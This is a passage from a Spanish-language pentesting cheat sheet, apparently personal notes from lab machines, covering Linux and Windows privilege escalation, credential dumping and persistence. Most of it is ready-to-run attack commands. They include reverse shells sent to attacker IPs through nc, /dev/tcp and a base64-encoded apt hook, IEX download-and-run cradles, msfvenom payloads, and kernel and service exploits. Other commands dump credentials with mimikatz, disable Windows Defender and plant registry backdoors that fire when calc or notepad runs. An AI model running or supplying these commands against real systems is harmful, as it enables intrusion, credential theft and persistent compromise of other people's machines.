sudo systemctl restart ssh # Si todavía no me puedo conectar, reinicio el servicio ssh

ssh <USUARIO>@<IP> # Me conecto
```
#### Otros
- Para transferir archvos desde la máquina objetivo a mi equipo:
```bash
nc -nlvp 443 > content.zip # Primero abro nc en mi equipo
cat content.zip > /dev/tcp/10.10.14.4/443 # Después desde la máquina objetivo Linux
```
- Para transferir archvos desde mi equipo a la máquina objetivo:
```bash
nc -nlvp 443 < content.zip # Primero abro nc en mi equipo
cat < /dev/tcp/10.10.14.4/443 > content.zip # Después desde la máquina objetivo Linux
```
- Para ejecutar comandos desde nano primero entramos y pulsamos (control + r) y después (control + x), escribimos el comando que queremos y pulsamos (Enter), salimos (control + x) y ya tendría que estar el comando ejecutado.
- Si un usb esta todavía conectado puedo intentar ver el historico de comandos utilizados con el comando strings y a continuación la partición en la que está conectado: `strings /dev/sdb`
## Herramientas para enumerar un sistema Linux
#### linpeas
- Para enumerar una máquina Linux desde dentro:
```bash
# Descargar: https://github.com/carlospolop/PEASS-ng/releases/tag/20220925
linpeas.sh # Ejecutar en la máquina objetivo
```
#### pspy
- Si quiero monitorizar los comandos que se ejecutan a intervalos regulares de tiempo en un sistema linux:
```bash
# Descargar: https://github.com/DominicBreuker/pspy
pspy # Ejecutar en la máquina objetivo
```
## Escalada de Privilegios Linux
#### Pkexec Pwnkit
- Si `pkexec es suid` puedo escalar privilegios con https://github.com/berdav/CVE-2021-4034 , me clono el repositorio y lo envio a la máquina objetivo, entro dentro y lanzo el comando make para compilarlo y después lanzo el archivo compilado.
- Este es otro repositorio para poder explotar esta vulnerabilidad: https://github.com/ly4k/PwnKit (Contiene binario)
#### lxd
- Uno de los priviliegios de estar en este grupo es que puedes crear un contenedor, con este exploit crearemos un contenedor en /mnt/root que contenga toda la raiz de la máquina real:
```bash
searchsploit -m linux/local/46978.sh
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine # Descarga la imagen
sudo bash build-alpine # Crea un comprimido
&& lxc image list # Quitar esta parte del script
# Subir el script (y darle permisos de ejecución) y el comprimido a la máquina opjetivo
./46978.sh -f alpine-v3.16-x86_64-20220901_1139.tar.gz # Ejecutar el script con el comprimido
# Si tengo errores de que no encuestra lxc puede que sea por el PATH que no contempla la ruta del lxc
```
#### Dirty Cow
- Esta vulnerabilidad afecta al kernel y permite escalar privilegios en versiones de kernel vulnerables:
```bash
searchsploit -m linux/local/40839.c # Linux Kernel 2.6.22 < 3.9 - Dirty COW
# Subo el archivo -c a la máquina objetivo lo renombro y le doy permisos de ejecución
gcc -pthread dirty.c -o dirty -lcrypt # Lo compilo
./dirty # Lo ejecuto y me pide que le asigne una contraseña al nuevo usuario que nos crea el exploit (firefart).
su firefart # Ahora me convierto en el usuario firefart que está en el grupo root
```
#### Pre Invoke
- Si existe una tarea cron que está configurada para actualizar el sistema con `apt update`, puedo intentar subir un archivo malicioso para que me ejecute un comando antes de realizar la actualización que está programada en la tarea cron:
```bash
Fuente: https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/

APT::Update::Pre-Invoke {"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC80NDMgMD4mMQo= | base64 -d | bash";}; # Primero creo un archivo con este contenido. El código en base64 es nuetro comando para una reverse shell (bash -i >& /dev/tcp/10.10.14.10/443 0>&1)
# Ahora tengo que subir el archivo a la ruta /etc/apt/apt.conf.d/ y ponerme en escucha
put evil /etc/apt/apt.conf.d/evil # Comando para subir el archivo
```
#### SETENV
- Si al hacer `sudo -l` veo que que puedo ejecutar algún archivo como root (en este ejemplo /opt/cleanup.sh) y también aparece SETENV, puedo intentar cambiar las variables de entorno como el PATH para escalar privilegios:
```bash
> 1º Forma:

# El archivo contiene el uso del binario find, pero sin indicar la ruta absoluta, así que creo mi propio archivo find en el directorio tmp: 

/bin/bash # El contenido
chmod +x find
sudo PATH=/tmp:$PATH /opt/cleanup.sh # Ejecuto el script /opt/cleanup.sh indicando el directorio /tmp como ruta del PATH

> 2º Forma:
Fuente: https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

# Creo un script llamado shell.c con el siguiente contenido:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/usr/bin/bash"); # Mirar donde esta la bash
}

gcc -fPIC -shared -o shell.so shell.c -nostartfiles # Lo compilo y lo subo al equipo objetivo
sudo LD_PRELOAD=/home/wizard/photobomb/shell.so /opt/cleanup.sh # Ejecuto el script /opt/cleanup.sh junto con mi script compilado shell.so
```
## Persistencia Linux
- Descargar o crear id_rsa para conectarme por ssh o jugar con la authorized_keys
## Windows
### Comandos Útiles Windows
```bash
https://live.sysinternals.com/ # Herramientas para Windows

whoami # Ver quien soy o también: echo %username%
arp -a # Vemos la composición de la tabla arp
arp -d # Borra todos los datos de la tabla arp
dir # Listar contenido ruta
dir -Force # Ver los archivos ocultos, también Get-ChildItem -Force
type #  Ver el contenido de un archivo
type C:\Windows\System32\drivers\etc\hosts # Archivo hosts en Windows
type ARCHIVO | findstr eltexto # Encuentra el texto que queremos dentro de un archivo
more ARCHIVO # Ver el contenido de un archivo
systeminfo # Ver información del sistema
net user # Ver los usuarios que hay
ipconfig  o  ipconfig /all # Ver la ip
tasklist # Ver los programas que están en ejecución y su PID
net user Tom # Ver los grupos en los que está el usuario
net user Tom Tom123$! /add # Crear un usuario
net localgroup # Ver los grupos disponibles
net localgroup Administrators Tom /add # Añade un usuario al grupo Adminitradores
net localgroup "Remote Management Users" Tom /add # Añade un usuario al grupo "Remote Management Users
hostname # Ver el nombre del equipo
DEL /F /A nombrearchivo # Borra un archivo
RD /S nombre carpeta # Borra una carpeta
dir /r /s user.txt  # Buscar un archivo, para poder buscar en todo el sistema mejor hacerlo estando en C:\
dir /r /s # Es para ver si hay alguna alternative data strings (lo comprueba en el diretorio en el que estoy) en el caso de que aparezca algo podemos intentar ver el contenido poniendo: more < hm.txt:root.txt
dir /s NOMBREARCHIVO # Poner esto en la raiz para encontrar un archivo
cd .. # Atrás
cd NOMBRECARPETA # Entrar
arp -a # Tabla arp
netstat -ano  O  netstat -ant  O  neststat -an # Ver los puertos abiertos
route print # Ver la tabla de enrutamiento
help # Ayuda comandos
whoami /priv # Privilegios de mi usuario
whoami /all # Ver todo lo que tiene que ver con mi usuario
icalcls NOMBREARCHIVO # Ver los permisos del archivo y si se añade más comandos se pueden modificar los permisos
where NOMBREARCHIVO # Para saber la ruta, donde está
echo TEXTO > ARCHIVO # Introduce texto directamente en un archivo
echo TEXTO >> ARCHIVO # Lo mismo pero sin borrar lo que ya tenía el archivo
type ARCHIVO | findstr eltexto # Encuentra el texto que queremos dentro de un archivo
certutil -hashfile <file> MD5 # Calcular el hash md5 para ver si la data ha sido modificada

> PowerShell
type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # Ver historial comandos de un usuario. Ejecutar desde C:\Users\<NOMBREUSUARIO>
more redis.windows.conf | select-string '^#' # Me quedo con todo lo que empieza por #
more redis.windows.conf | select-string '^#' -NotMatch # Me quedo con todo lo no empieza por #
more redis.windows.conf | select-string '^#' -NotMatch | select-string . # Quitar las lineas vacias
Get-ChildItem C:\Users user.txt -Recurse # Buscar un archivo de forma recursiva
dir C:\Users user.txt -Recurse # Buscar un archivo de forma recursiva
Get-ChildItem C:\ -Filter *.txt -Recurse # Buscar archivos con extensión txt de forma recursiva
dir C:\ -Filter *.txt -Recurse # Buscar archivos con extensión txt de forma recursiva
get-process # Ver los procesos que se estan ejecutando en el sistema. También ps
get-process firefox # Ver los procesos de un programa concreto
[environment]::Is64BitOperatingSystem # Si es True, estoy en un sistema de 64 bit
[environment]::Is64BitProcess # Si es True, estoy ejecutando un proceso de 64 bit
powershell.exe .\nc.exe 10.10.14.8 443 -e cmd.exe # Migrar de PowerShell a cmd. Primero me pongo en escucha y ejecuto este comando
.\nc64.exe -e powershell.exe 10.10.14.13 443 # Para tener una shell de PowerShell de 64 bit. Primero subo el nc64.exe, me pongo en escucha y ejecuto este comando
Set-MpPreference -DisableRealtimeMonitoring $true # Deshabilitar Windows Defender (tengo que ser nt authority system)

> Firewall
netsh firewall show state # Ver estado del firewall
netsh advfirewall show allprofiles # Ver estado del firewall
netsh advfirewall firewall add rule name="Puerto TCP XXXX" dir=in action=allow protocol=TCP localport=<Puerto> # Abrir puerto firewall
```
#### Concatenar comandos en Windows
```bash
Comando1 & Comando2 # Los dos comandos se ejecutarán de forma simultanea
Comando1 && Comando2 # El Comando2 se ejecutará solo si el Comando1 termina con éxito
Comando1 || Comando2 # El Comando2 se ejecutará solo si el primero termina sin éxito.
```
#### TTY Windows
- Hacer tratamiento de la TTY:
```bash
Fuente: https://github.com/antonioCoco/ConPtyShell

git clone https://github.com/antonioCoco/ConPtyShell # Clono el repositorio

Invoke-WebRequest -OutFile Invoke-ConPtyShell.ps1 http://10.10.14.9/Invoke-ConPtyShell.ps1 # Abro un servidor y subo el script
Import-Module .\Invoke-ConPtyShell.ps1 # Importo el módulo

Invoke-ConPtyShell -RemoteIp 10.10.14.9 -RemotePort 443 -Rows 60 -Cols 236 # Me pongo en escucha y lanzo el comando para recibir la shell

# Ahora en mi equipo:
Enter
ctrl+z
stty raw -echo; fg
Enter
Enter # Ya tendría una TTY interactiva
```
#### lookupsid.py
- Si tengo credenciales válidas puedo intentar enumerar el sistema con lookupsid para obtener más usuarios válidos:
```bash
lookupsid.py SUPPORTDESK/Hazard:stealth1agent@10.10.10.149
```
#### procdump
- Para dumpear la información contenida en un proceso que se esté ejecutando en el sistema:
```bash
Descargar: https://learn.microsoft.com/en-us/sysinternals/downloads/procdump

PS > ps # Ver los procesos existentes
PS > upload /home/kali/Desktop/procdump64.exe
PS > .\procdump64.exe -accepteula
PS > .\procdump64.exe -ma 332 # Dumpear un proceso, en este caso 332
PS > download C:\Users\Chase\Documents\firefox.exe_221030_160249.dmp firefox.dmp # Descargar el dumpeo

strings firefox.dmp | grep "password"
```
#### Impacket-psexec
- Con impacket-psexec podemos acceder a la máquina si tenemos credenciales válidas y nos proporciona una shell (también se puede poner psexec.py en vez de impacket-psexec):
```bash
impacket-psexec WORDKGROUP/Administrator:kidvscat_admin_@123@10.10.10.237 cmd.exe

> Si no me funciona, pongo primero el comando y después la contraseña cuando me la pida:
impacket-psexec WORDKGROUP/Administrator@10.10.10.237 cmd.exe # Comando
kidvscat_admin_@123 # Contraseña de ejemplo
```
- También podemos intentarlo si tenemos un hash válido, el nombre de la tecnica es Pass The Hash (también se puede poner psexec.py en vez de impacket-psexec): 
```bash
impacket-psexec WORDKGROUP/Administrator@10.10.10.63 -hashes :e0fb1fb85756c24235ff238cbe81fe00
```
#### Impacket-smbserver
```bash
impacket-smbserver smbFolder $(pwd) -smb2support # Crea el servidor
copy \\10.10.14.30\smbFolder\ARCHIVO ARCHIVO # Para subir archivos
copy ARCHIVO \\10.10.14.5\smbFolder\ARCHIVO # Para bajar archivos
copy \\10.10.14.11\smbFolder\ARCHIVO \Windows\Temp\ARCHIVO # Para subir un archivo con impacket en una ruta concreta en este caso temp
```
#### Impacket-smbserver usando credenciales
- Al usar Impacket-smbserver usando credenciales lo que hacemos es sincronizar un directorio de mi equipo con la máquina obejetivo:
```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username Tom -password Tom123$! # Mi equipo 
net use x: \\10.10.14.9\smbFolder /user:Tom Tom123$! # Equipo objetivo
dir x:\ # Para ver el contenido del directorio compartido
copy x:\evil.bat evil.bat # Para transferir archivos a la máquina objetivo
copy evil.bat x:\evil.bat # Para transferir archivos desde la máquina objetivo a mi equipo
```
#### Otros
- Para poder llervar archivos desde la máquina atacante a la máquina objetivo:
```bash
Invoke-WebRequest -OutFile ARCHIVO http://192.168.1.60/ARCHIVO
certutil.exe -urlcache -f -split http://192.168.1.60/ARCHIVO ARCHIVO
powershell.exe -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8/file','C:\Windows\Temp\file')" Transferir un archivo compartido a través de un servidor con python y depositarlo en una ruta concreta.
curl http://192.168.1.60/ARCHIVO -o ARCHIVO
 ```
- Para transferir archvos desde la máquina objetivo a mi equipo:
```bash
nc -l -p 1234 > ARCHIVO  # Primero en mi equipo
c:\nc.exe  -w 3 10.10.14.19 1234 < ARCHIVO # Después desde la máquina objetivo windows
```
- Si me encuentro dos `archivos uno .dit y otro system o .bin` puedo intentar `ver los hashes que contienen`, primero los transfiero a mi equipo y hago `[mv file.dit ntds.dit]` y `[mv file.bin SYSTEM]` y después utilizo desde mi máquina atacante: `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`
## Herramientas para enumerar un sistema Windows
#### Windows exploit suggester
```bash
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
cd Windows-Exploit-Suggester
./windows-exploit-suggester.py --update 
./windows-exploit-suggester.py -d 2021-10-31-mssb.xls -i systeminfo.txt 																				
> Si tenemnos proplemas al intalar dependencias mirar en https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/43#issuecomment-860152002
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python get-pip.py
python -m pip install --user xlrd==1.1.0
```
#### Winpeas.exe
- Enumera el sistema para encontrar formas de escalar privilegios:
```bash
Descargar: https://github.com/carlospolop/PEASS-ng/releases/tag/20221023
```
#### SharpUp.exe
- Enumera el sistema para encontrar formas de escalar privilegios:
```bash
Descargar: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
Uso: https://github.com/GhostPack/SharpUp

# Me descargo el binario y lo subo a la máquina objetivo
.\SharpUp.exe audit # Ejecutar
```
#### PowerUp.ps1
- Enumera el sistema para encontrar formas de escalar privilegios:
```bash
Descargar: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1

Invoke-AllChecks # Poner al final
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.19/PowerUp.ps1') # Se ejecutará a la vez que lo subo al poner al final Invoke-AllChecks
```
#### Sherlock.ps1
- Enumera el sistema para encontrar formas de escalar privilegios:
```bash
Descargar: https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1

Find-AllVulns # Poner al final
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/Sherlock.ps1') # Se ejecutará a la vez que lo subo al poner al final Find-AllVulns
```
#### Invoke-Portscan.ps1
- Script para encontrar puertos abiertos en Windows:
```bash
Descargar: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1

PS> Import-Module .\Invoke-Portscan.ps1
PS> Invoke-Portscan -hosts 192.168.80.130 -oA Ports # Escanea todos los puertos abiertos y exporta el resultado

PS> Invoke-Portscan -hosts 192.168.80.0/24 -oA Ports # Escanea todos los host activos y exporta el resultado
```
## Escalada de Privilegios Windows
#### JuicyPotato
- Si estoy en un equipo con `Microsoft Windows 7/10/Server 2008` y tengo el privilegio `SeImpersonatePrivilege` puedo intentar escalar priviliegios con JuicyPotato.exe. Para hacerlo me descargo el binario del repositorio:
```bash
https://github.com/ohpe/juicy-potato # 64 bits
https://github.com/ivanitlearning/Juicy-Potato-x86/releases # 32 bits
```
Dentro del repositorio también hay un enlace a otros CLSID, por si falla y también el nc.exe (32 o 64 bits segun corresponda) y los subo a la máquina objetivo.
- Ahora me pongo en escucha desde mi máquina y desde la máquina objetivo lanzo:
```bash
./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\nc64.exe -e cmd 10.10.14.2 443"
./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\si\nc.exe -e cmd 10.10.14.7 4445" -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" # Lo mismo pero incorporando también un CLSID específico

> Otra forma de hacerlo es crear un binario para entablarme una reverse shell y subirlo junto con el JuicyPotato.exe (Mirar otros CLSID si es necesario):
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe # Creo el binario
JuicyPotato.exe -t * -p C:\Windows\Temp\shell.exe -l 1337 -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} # Me pongo en escucha y lo ejecuto
```
#### JuicyPotato (Crear usuario para conectarme)
- Otra forma de usar JuicyPotato.exe es, crear un usuario y darle permisos de adminitración para poder conentarme con impacket-psexec:
```bash
C:\Windows\Temp\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c net user Tom Tom123$! /add" # Creo el usuario
C:\Windows\Temp\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c net localgroup Administrators Tom /add" # Lo meto en el grupo Administrators
C:\Windows\Temp\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" # Retoco los permisos para que me ponga (Pwn3d!) en crackmapexec y poder conectarme

impacket-psexec WORDKGROUP/Tom:Tom123$!@10.10.10.63 cmd.exe # Ahora me intento conectar con impacket-psexec

> En el caso que no me permita conectarme puedo crear un recurso compartido y después volver a intentar conectarme:
C:\Windows\Temp\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c net share myFolder=C:\Windows\Temp /GRANT:Administrators,FULL"
```
#### Churrasco
- Si estoy en un equipo con `Microsoft Windows XP/VISTA/2003/2008` y tengo el privilegio `SeImpersonatePrivilege` puedo intentar escalar priviliegios con churrasco.exe:
```bash
# Me pongo en escucha desde mi equipo y lanzo uno de los siguientes comandos
churrasco.exe "C:\WINDOWS\Temp\mio\nc.exe -e cmd 10.10.14.30 443" # Subo el churrasco.exe y nc.exe
churrasco.exe "\\10.10.14.30\smbFolder\nc.exe -e cmd 10.10.14.30 443" # Subo el binario y uso nc desde mi equipo
```
#### PrintSpoofer
- Si estoy en un equipo con `Windows 10/Server 2016/Server 2019` y tengo el privilegio SeImpersonatePrivilege puedo intentar escalar priviliegios con PrintSpoofer.exe:
```bash
Descargar: https://github.com/itm4n/PrintSpoofer

certutil.exe -urlcache -f -split http://10.10.14.2/PrintSpoofer64.exe PrintSpoofer64.exe # Subo el PrintSpoofer64.exe
certutil.exe -urlcache -f -split http://10.10.14.2/nc.exe nc.exe # Subo el nc.exe

C:\windows\temp\PrintSpoofer64.exe -c "C:\windows\temp\nc.exe -e cmd 10.10.14.2 443" # Me pongo en escucha y ejecuto el comando
```
#### Server Operators
- Si estoy en el local group Server Operators, eso quiere decir que puedo crear o modificar algunos servicios. Pongo services, para ver los servicios que están corriendo.
```bash
upload /usr/share/windows-resources/binaries/nc.exe #  Primero subo el nc.exe a la máquina objetivo
services # Después pongo services, para ver los servicios que estan corriendo.
```
- Intento crear un servicio, aunque puedo no poder hacerlo.
```bash
sc.exe create reverse binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.7 443" # Intento crear el servicio
sc.exe start reverse # Ahora me pongo en escucha en mi equipo, e intento lanzar el servicio si es que me ha dejado crearlo
```
- Intento modificar un servicio, aunque puedo no poder hacerlo, asi que lo intento con varios servicios.
```bash
sc.exe config WMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.7 443" # Intento modificar el servicio
sc.exe config WMTools binPath="C:\windows\system32\cmd.exe /c C:\Windows\Temp\privesc\nc64.exe -e cmd 10.10.14.3 443" # Otra forma de modificarlo, lanzando el nc64.exe desde una cmd.exe para que aunque el servicio se pare el nc seguirá activo

sc.exe stop WMTools # Paro el servicio
sc.exe start WMTools # Ahora me pongo en escucha en mi equipo y arranco el servicio.
```
#### UsoSvc CVE 2019 1322
```bash
Fuente: https://fwhibbit.es/htb-writeup-remote
Fuente: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/PowerUp.ps1') # Ejecuto el PowerUp.ps1 y me da el siguiente output:

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

> Para explotar esta vulnerabilidad:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f exe -o shell.exe # Me creo un binario malicioso
certutil.exe -urlcache -f -split http://10.10.14.2/shell.exe shell.exe # Lo subo
sc.exe qc UsoSvc 
sc.exe config UsoSvc binPath="C:\windows\temp\shell.exe" # Configuro el servicio
sc.exe stop UsoSvc # Lo paro
sc.exe start UsoSvc # Me pongo en escucha y arranco el servicio de nuevo para obtener una shell
```
#### Spoolsv
- Este ejecutable gestiona la cola de impresión de una impresora. Si lo encuentro en la máquina objetivo puedo intentar explotarlo con el siguiente exploit. Este exploit me crea un usuario con permisos de adminsitrador, que me permitira conectarme por ejemplo con winrm o psexec:
```bash
winpeas # Subo winpeas y lo ejecuto para ver si encuestro el binario
CVE-2021-1675 - PrintNightmare LPE (PowerShell): https://github.com/calebstewart/CVE-2021-1675 # Me descargo este exploit y lo subo a la máquina objetivo
python3 -m http.server 80 # Mi equipo
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/CVE-2021-1675.ps1') # Desde la máquina objetivo
Invoke-Nightmare -DriverName "Xerox" -NewUser "Tom" -NewPassword "Tom.123!$" # Comando para crear el usuario
evil-winrm  -i 10.10.11.106 -u 'Tom' -p 'Tom.123!$' # Prueba de conexión con evil-winrm después de verificar las credenciales con crackmapexec
impacket-psexec WORDKGROUP/Tom@10.10.11.106 cmd.exe # También puedo conectarme con psexec, primero este comando y despues me pide la contraseña
Tom.123!$ # La contaseña del ejemplo
```
#### MS10-059 Windows 7 Enterprise
```bash
./windows-exploit-suggester.py -d 2022-10-04-mssb.xls -i ../Desktop/systeminfo.txt # Si detecto esta vulnerabilidad, por ejemplo con windows-exploit-suggester.py
Kernel: OS Version: 6.1.7600 N/A Build 7600
Descargar: https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe
certutil.exe -urlcache -f -split http://10.10.14.8/Chimichurri.exe Chimichurri.exe # Me comparto el binario con un servidor en python y lo subo al equipo objetivo
.\Chimichurri.exe 10.10.14.8 443 # Me pongo en escucha y lo ejecuto
```
#### MS11-046 kernel Windows 7 Server 2003
```bash
Kernel: OS Version: 6.1.7600 N/A Build 7600 
File: afd.sys
Fuente: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046
copy \\10.10.14.10\smbFolder\ms11-046.exe # Subo el binario al equipo objetivo
ms11-046.exe # Lo ejecuto y ya sería nt authority\system
```
#### MS15-051 kernel Microsoft Windows Server 2008 Windows 7 Windows Server 2003
```bash
Kernel: OS Version: 6.1.7600 N/A Build 7600 
Fuente: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
Descargar: https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip
Descomprimir: unzip MS15-051-KB3045171.zip 
certutil.exe -urlcache -f -split http://10.10.14.7/ms15-051x64.exe ms15-051x64.exe # Me comparto el binario con un servidor en python y lo subo al equipo objetivo
certutil.exe -urlcache -f -split http://10.10.14.7/nc.exe nc.exe # Subo también el nc.exe
.\ms15-051x64.exe "C:\windows\temp\nc.exe -e cmd 10.10.14.7 4444" # Me pongo en escucha y lo ejecuto
```
#### MS16-098 kernel Windows Server 2012
```bash
./windows-exploit-suggester.py -d 2022-10-04-mssb.xls -i ../Desktop/systeminfo.txt # Si detecto esta vulnerabilidad, por ejemplo con windows-exploit-suggester.py
Kernel: OS Version: 6.3.9600 N/A Build 9600 
Descargar: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
certutil.exe -urlcache -f -split http://10.10.14.8/41020.exe 41020.exe
41020.exe # Lo ejecuto y ya sería nt authority\system
```
#### AutoLogon Credentials
##### AutoLogon Credentials Run-as:
- Con las credenciales almacenadas de AutoLogon podemos intentar obtener una shell como administrador. Este ejemplo está sacado de la máquina Bart y se ha realizado en un proceso de 64 bit en (nc64.exe):
```bash
Fuente: https://www.noobsec.net/hackthebox/htb-bart/

[environment]::Is64BitOperatingSystem # Si es True, estoy en un sistema de 64 bit
[environment]::Is64BitProcess # Si es True, estoy ejecutando un proceso de 64 bit

REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64 # Ver las credenciales que están almacenadas en texto plano. También con SharpUp.exe o Winpeas.exe entre otros
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"# También esto

> Ahora para obtener la shell como administrador, me pongo en eschucha y comparto el script Invoke-PowerShellTcp.ps1. Después desde la máquina objetivo ejecuto cada uno de los comandos para setear las credenciales y ejecuto el último comando para obtener la shell:

$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/Invoke-PowerShellTcp.ps1') } -Credential $cred -Computer localhost
```
##### AutoLogon Credentials con chisel:
- Para conectarme con estas credenciales a través de smbexec.py o impacket-psexec es necesario que el puerto 445 este abierto, si no lo está puedo intentar abrirlo o utilizar chisel para hacer accesible el puerto 445:
```bash
./chisel server -p 8099 --reverse # Ejecuto chisel en mi máquina
.\chisel.exe client 10.10.14.13:8099 R:445:127.0.0.1:445 # Ejecuto chisel en la máquina objetivo para traerme el puerto 445

sudo nmap -sS --open -p445 -T4 -n -v -Pn 127.0.0.1 # Compruebo que el puerto es accesible

# Formas de conectarme:

impacket-psexec WORDKGROUP/Administrator@127.0.0.1 cmd.exe# Lo ejecuto y después pongo la contraseña
smbexec.py BART/Administrator:3130438f31186fbaf962f407711faddb@127.0.0.1 # Incluye la contraseña
```
#### AlwaysInstallElevated
- Si con `winpeas.exe` veo: `AlwaysInstallElevated set to 1 in HKLM!` y `AlwaysInstallElevated set to 1 in HKCU!`. Puedo intentar explotarlo creando un payload con msfvenom: 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f msi -o reverse.msi # Payload
msiexec /quiet /qn /i C:\windows\temp\si\reverse.msi # Después lo subo a la máquina objetivo y lo ejecuto
```
##  Dumpear contraseñas                                        
#### Lazagne.exe
- Para dumpear las contraseñas y hashes de la sam primero descargo `lazagne.exe` de https://github.com/AlessandroZ/LaZagne/releases y lo subo a la máquina objetivo y lo ejecuto poniendo:
```bash
lazagne.exe all
```
#### Mimikatz.exe
- Para dumpear las contraseñas y hashes de la sam primero descargo `mimikatz.exe` de https://github.com/gentilkiwi/mimikatz/releases y lo subo a la máquina objetivo y lo ejecuto poniendo:
```bash
mimikatz.exe # Después me sale una consola y escribo los siguientes tres comandos
privilege::debug
token::elevate
lsadump::sam

> O también esto:
privilege::debug
sekurlsa::logonPasswords # O esto => sekurlsa::logonPasswords full

> Mimikatz con Evil-winrm
upload /home/kali/Desktop/x64/mimikatz.exe
./mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"

> Si tengo algún problema al ejecutarlo, que se quede colgado o algo así, puedo intentar ejecutarlo en un solo comando incluyendo el comando exit para salir:

.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```
#### Samdump2
- Para dumpear la sam hacemos esto en la máquina windows:
```bash
reg save hklm\sam c:\sam
reg save hklm\system c:\system

samdump2 system sam # Después en mi equipo

> O también:
impacket-secretsdump -sam sam -system system LOCAL
```
#### crackmapexec
- Para dumpear la sam hacemos desde mi equipo:
```bash
crackmapexec smb 10.10.10.9 -u 'Administrator' -p 'keWNUkrIekw!' --sam
```
## Persistencia Windows
- Crear usuario administrador para conectarme con evil-winrm.
- Si el usuario está en el grupo RDP o tengo credenciales puedo intentar conectarme con rdesktop o xfreerdp.
#### Ejemplo 1 (Windows 7)
- Para recibir una shell cada vez que se abre la calculadora en la máquina objetivo:
```bash
copy calc.exe _calc.exe # Estando en el system32 de la máquina objetivo.
# Después subo el nc.exe a la carpeta Temp
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & C:\windows\Temp\nc.exe -e c:\windows\system32\cmd.exe 10.10.14.8 443" /f # Por último me pongo en escucha y ejecuto este comando. Al abrir la calculadora se me enviará una shell.
```
#### Ejemplo 2 (Windows 7)
- Para recibir una shell cada vez que se cierre el notepad.exe en la máquina objetivo, tengo que subir tambien el nc.exe:
```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\Windows\Temp\nc.exe -e C:\Windows\system32\cmd.exe 10.10.14.8 443"
```
#### Ejemplo 3 (Windows 7)
- Para recibir una shell cada minuto, tengo que subir el shell.exe creado con msfvenom y también el nc.exe:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f exe -o shell.exe
